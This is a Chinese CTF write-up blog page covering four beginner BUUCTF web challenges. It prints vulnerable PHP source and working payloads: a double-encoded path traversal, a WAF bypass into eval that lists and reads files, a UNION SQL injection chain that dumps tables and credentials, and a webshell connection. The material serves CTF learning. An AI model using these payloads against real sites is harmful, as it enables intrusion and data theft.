@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="碎碎叨叨： 经过了漫长的睡眠后（玩耍）后，我又可以了，接着写博客 今天小姐姐有事出去了 没打游戏，我是不是可以早睡了？（某人：做梦，写你的wp去！） 9.[HCTF 2018]WarmUp打开页面 一个滑稽 然后呢 没有了 （滑稽：我就静静的看着你懵逼） 日常看源码 发现一个注释 source.php 那访问康康 .&#x2F;source.php QAQ 出现了一堆奇奇怪怪 让人头大的代码 1234567">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuwp3">
+<meta property="og:url" content="http://yoursite.com/2020/09/02/buuwp3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="碎碎叨叨： 经过了漫长的睡眠后（玩耍）后，我又可以了，接着写博客 今天小姐姐有事出去了 没打游戏，我是不是可以早睡了？（某人：做梦，写你的wp去！） 9.[HCTF 2018]WarmUp打开页面 一个滑稽 然后呢 没有了 （滑稽：我就静静的看着你懵逼） 日常看源码 发现一个注释 source.php 那访问康康 .&#x2F;source.php QAQ 出现了一堆奇奇怪怪 让人头大的代码 1234567">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/wSYZNT.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/wSY75T.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/03/wClfmt.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/03/wC1mtO.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/03/wC3Sbt.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/03/wC8h01.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/03/wCG7Eq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/03/wCttNq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/03/wCt6ER.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/03/wCtIDH.png">
+<meta property="article:published_time" content="2020-09-02T03:26:04.000Z">
+<meta property="article:modified_time" content="2020-09-03T03:19:13.630Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/09/02/wSYZNT.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>buuwp3</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+    
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+    <!-- jquery -->
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div class="banner">
+<div id="blogtitel" class="blogtitel">Hexo</div>
+<ul id="wrapper" class="wrapper">
+  <div class="sun">
+    <div class="star"></div>
+  </div>
+  <div class="mercury">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="venus">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="earth">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="mars">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="jupiter">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+</ul>
+</div>
+
+    <div class="background">
+      
+        <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com" target="_blank" rel="noopener">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/08/30/buuwp2/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/09/02/buuwp3/" target="_blank" rel="noopener"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/09/02/buuwp3/&text=buuwp3" target="_blank" rel="noopener"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/09/02/buuwp3/&title=buuwp3" target="_blank" rel="noopener"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/09/02/buuwp3/&is_video=false&description=buuwp3" target="_blank" rel="noopener"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=buuwp3&body=Check out this article: http://yoursite.com/2020/09/02/buuwp3/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/09/02/buuwp3/&title=buuwp3" target="_blank" rel="noopener"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/09/02/buuwp3/&title=buuwp3" target="_blank" rel="noopener"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/09/02/buuwp3/&title=buuwp3" target="_blank" rel="noopener"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/09/02/buuwp3/&title=buuwp3" target="_blank" rel="noopener"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/09/02/buuwp3/&name=buuwp3&description=" target="_blank" rel="noopener"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#9-HCTF-2018-WarmUp"><span class="toc-number">1.</span> <span class="toc-text">9.[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10-RoarCTF-2019-Easy-Calc"><span class="toc-number">2.</span> <span class="toc-text">10.[RoarCTF 2019]Easy Calc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-极客大挑战-2019-LoveSQL"><span class="toc-number">3.</span> <span class="toc-text">11.[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#12-极客大挑战-2019-Knife"><span class="toc-number">4.</span> <span class="toc-text">12.[极客大挑战 2019]Knife</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#师傅说16个buu-可以入门web-还有四篇-我可以-hhh"><span class="toc-number">4.1.</span> <span class="toc-text">师傅说16个buu 可以入门web 还有四篇 我可以 hhh</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+      
+      <div class="content index width mx-auto px2 my4">
+          
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        buuwp3
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Hexo</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2020-09-02T03:26:04.000Z" itemprop="datePublished">2020-09-02</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>碎碎叨叨： 经过了漫长的睡眠后（<del>玩耍</del>）后，我又可以了，接着写博客 今天小姐姐有事出去了 没打游戏，我是不是可以早睡了？（某人：做梦，写你的wp去！）</p>
+<h1 id="9-HCTF-2018-WarmUp"><a href="#9-HCTF-2018-WarmUp" class="headerlink" title="9.[HCTF 2018]WarmUp"></a>9.[HCTF 2018]WarmUp</h1><p>打开页面 一个滑稽 然后呢 没有了 （滑稽：我就静静的看着你懵逼）</p>
+<p>日常看源码 发现一个注释 source.php</p>
+<p>那访问康康 ./source.php</p>
+<p>QAQ 出现了一堆<del>奇奇怪怪 让人头大</del>的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>那就是php 代码审计</p>
+<p> 开始分析——开始迷糊——逐渐抓狂——放弃分析——要打人了</p>
+<p> 好吧 继续分析</p>
+<p> 看到whitelist 有 source 和 hint  那尝试访问 hint.php</p>
+<p> 得到hint：flag not here, and flag in ffffllllaaaagggg</p>
+<p> 然后返回看源代码</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (       ! empty($_REQUEST[&#39;file&#39;])          &#x2F;&#x2F;file不是空的</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])         &#x2F;&#x2F; file的值是字符串</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])   &#x2F;&#x2F;能够通过checkFile函数校验</span><br><span class="line">    ) </span><br><span class="line">    &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];   &#x2F;&#x2F;输出file</span><br><span class="line">    &#125; </span><br><span class="line">else </span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;                                &#x2F;&#x2F;打印滑稽</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后回到checkfile </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>第一个if：要求$page为字符串，否则返回false</p>
+<p>第二个if: 判断$page是否存在于$whitelist数组中，存在则返回true</p>
+<p>第三个if：判断截取后的$page是否存在于$whitelist数组中，截取$page中’?’前部分，存在则返回true</p>
+<p>第四个if： 判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true</p>
+<p>若以上四个if语句均未返回值，则返回false</p>
+<p>将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。（’?’两次编码值为’%253f’）</p>
+<p>http://<strong><em>:</em></strong>/source.php?file=source.php%253f../ffffllllaaaagggg</p>
+<p>但是不知道./ffffllllaaaagggg的具体位置 只能一个一个试</p>
+<p>最终：./source.php?file=source.php%253f../../../../../ffffllllaaaagggg</p>
+<p>得到flag：flag{705f1342-2e1d-443d-a480-9c8580698c38}</p>
+<h1 id="10-RoarCTF-2019-Easy-Calc"><a href="#10-RoarCTF-2019-Easy-Calc" class="headerlink" title="10.[RoarCTF 2019]Easy Calc"></a>10.[RoarCTF 2019]Easy Calc</h1><p>打开 是一个计算器 那就先算算 然后瞎输点东西康康 发现字符被拦截，还真是一个计算器 </p>
+<p>那咋办呢 看源码吧 发现一条注释：</p>
+<p>I’ve set up WAF to ensure security.</p>
+<p>然后发现一个 calc.php 访问一下 得到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#39;num&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line">        $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&#39;echo &#39;.$str.&#39;;&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>php的解析规则，当php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析,利用这一点来绕过waf</p>
+<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】</p>
+<p>之前点源码发现的js代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$(&#39;#calc&#39;).submit(function()&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:&quot;calc.php?num&#x3D;&quot;+encodeURIComponent($(&quot;#content&quot;).val()),</span><br><span class="line">            type:&#39;GET&#39;,</span><br><span class="line">            success:function(data)&#123;</span><br><span class="line">                $(&quot;#result&quot;).html(&#96;&lt;div class&#x3D;&quot;alert alert-success&quot;&gt;</span><br><span class="line">            &lt;strong&gt;答案:&lt;&#x2F;strong&gt;$&#123;data&#125;</span><br><span class="line">            &lt;&#x2F;div&gt;&#96;);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:function()&#123;</span><br><span class="line">                alert(&quot;这啥?算不来!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        return false;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
+<p>url:”calc.php?num=”+encodeURIComponent($(“#content”).val()),</p>
+<p>查$(“#content”).val() 是什么意思：</p>
+<p>获取id为content的HTML标签元素的值,是JQuery,     $(“#content”)相当于document.getElementById(“content”);      </p>
+<p> $(“#content”).val()相当于 document.getElementById(“content”).value;</p>
+<p> 继续做题<br> 扫描根目录：? num=var_dump(scandir(chr(47)))</p>
+<p> 得到：<br> <img src="https://s1.ax1x.com/2020/09/02/wSYZNT.png" alt="wSYZNT.png"></p>
+<p> 然后get flag （过滤字母 用ascii）</p>
+<p> calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</p>
+<p> 得到flag :flag{7971aea8-fc65-4488-85e3-0d1b04f9e9bd}</p>
+<h1 id="11-极客大挑战-2019-LoveSQL"><a href="#11-极客大挑战-2019-LoveSQL" class="headerlink" title="11.[极客大挑战 2019]LoveSQL"></a>11.[极客大挑战 2019]LoveSQL</h1><p> 打开发现又是熟悉的登录页面</p>
+<p> 然后万能密码试一试 哦上去了  然后他说：</p>
+<p> <img src="https://s1.ax1x.com/2020/09/02/wSY75T.png" alt="wSY75T.png"></p>
+<p> 于是提交flag：flag{c19cda7cfecd42a4905f339eb62e15c3}</p>
+<p>这么简单吗？</p>
+<p>那必然不可能 incorrect的快乐你不懂</p>
+<p>怎么可能就这样就让你过了 只怪自己当初太天真</p>
+<p>love sql 那注入吧 </p>
+<p>先康康有几个字段：</p>
+<p>./check.php?username=admin’ order by 3%23&amp;password=1</p>
+<p>(%23是#的url编码)</p>
+<p>测试4的时候 返回无 说明有三个字段</p>
+<p><img src="https://s1.ax1x.com/2020/09/03/wClfmt.png" alt="wClfmt.png"></p>
+<p>接下来测试注入点（回显位）</p>
+<p>./check.php?username=1’ union select 1,2,3%23&amp;password=1</p>
+<p>显示：</p>
+<p><img src="https://s1.ax1x.com/2020/09/03/wC1mtO.png" alt="wC1mtO.png"></p>
+<p>查询当前数据库名字 和版本</p>
+<p>./check.php?username=1’ union select 1,database(),version()%23&amp;password=1</p>
+<p>回显：</p>
+<p><img src="https://s1.ax1x.com/2020/09/03/wC3Sbt.png" alt="wC3Sbt.png"></p>
+<p>名字叫geek</p>
+<p>接下来：爆表 </p>
+<p>/check.php?username=1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=1</p>
+<p><img src="https://s1.ax1x.com/2020/09/03/wC8h01.png" alt="wC8h01.png"></p>
+<p>爆出俩表 试一下后面辣个（名字起得和题目有点像）</p>
+<p>爆字段：</p>
+<p>/check.php?username=1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’l0ve1ysq1’%23&amp;password=1</p>
+<p><img src="https://s1.ax1x.com/2020/09/03/wCG7Eq.png" alt="wCG7Eq.png"></p>
+<p>最后爆表中的数据</p>
+<p>/check.php?username=1’ union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password=1</p>
+<p>得到flag：flag{2830b9a7-be8d-4cd9-ad8a-d6327eae3a13}</p>
+<h1 id="12-极客大挑战-2019-Knife"><a href="#12-极客大挑战-2019-Knife" class="headerlink" title="12.[极客大挑战 2019]Knife"></a>12.[极客大挑战 2019]Knife</h1><p>题目提示菜刀  用蚁剑连接</p>
+<p><img src="https://s1.ax1x.com/2020/09/03/wCttNq.png" alt="wCttNq.png"></p>
+<p><img src="https://s1.ax1x.com/2020/09/03/wCt6ER.png" alt="wCt6ER.png"></p>
+<p>然后用虚拟终端cat flag</p>
+<p><img src="https://s1.ax1x.com/2020/09/03/wCtIDH.png" alt="wCtIDH.png"></p>
+<p>得到flag :flag{9b623a1f-ca58-4dd3-a0ac-9529556ad0b3}</p>
+<h2 id="师傅说16个buu-可以入门web-还有四篇-我可以-hhh"><a href="#师傅说16个buu-可以入门web-还有四篇-我可以-hhh" class="headerlink" title="师傅说16个buu 可以入门web 还有四篇 我可以 hhh"></a>师傅说16个buu 可以入门web 还有四篇 我可以 hhh</h2>
+  </div>
+</article>
+
+
+
+      </div>
+      
+       <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com" target="_blank" rel="noopener">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#9-HCTF-2018-WarmUp"><span class="toc-number">1.</span> <span class="toc-text">9.[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10-RoarCTF-2019-Easy-Calc"><span class="toc-number">2.</span> <span class="toc-text">10.[RoarCTF 2019]Easy Calc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-极客大挑战-2019-LoveSQL"><span class="toc-number">3.</span> <span class="toc-text">11.[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#12-极客大挑战-2019-Knife"><span class="toc-number">4.</span> <span class="toc-text">12.[极客大挑战 2019]Knife</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#师傅说16个buu-可以入门web-还有四篇-我可以-hhh"><span class="toc-number">4.1.</span> <span class="toc-text">师傅说16个buu 可以入门web 还有四篇 我可以 hhh</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/09/02/buuwp3/" target="_blank" rel="noopener"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/09/02/buuwp3/&text=buuwp3" target="_blank" rel="noopener"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/09/02/buuwp3/&title=buuwp3" target="_blank" rel="noopener"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/09/02/buuwp3/&is_video=false&description=buuwp3" target="_blank" rel="noopener"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=buuwp3&body=Check out this article: http://yoursite.com/2020/09/02/buuwp3/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/09/02/buuwp3/&title=buuwp3" target="_blank" rel="noopener"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/09/02/buuwp3/&title=buuwp3" target="_blank" rel="noopener"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/09/02/buuwp3/&title=buuwp3" target="_blank" rel="noopener"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/09/02/buuwp3/&title=buuwp3" target="_blank" rel="noopener"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/09/02/buuwp3/&name=buuwp3&description=" target="_blank" rel="noopener"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
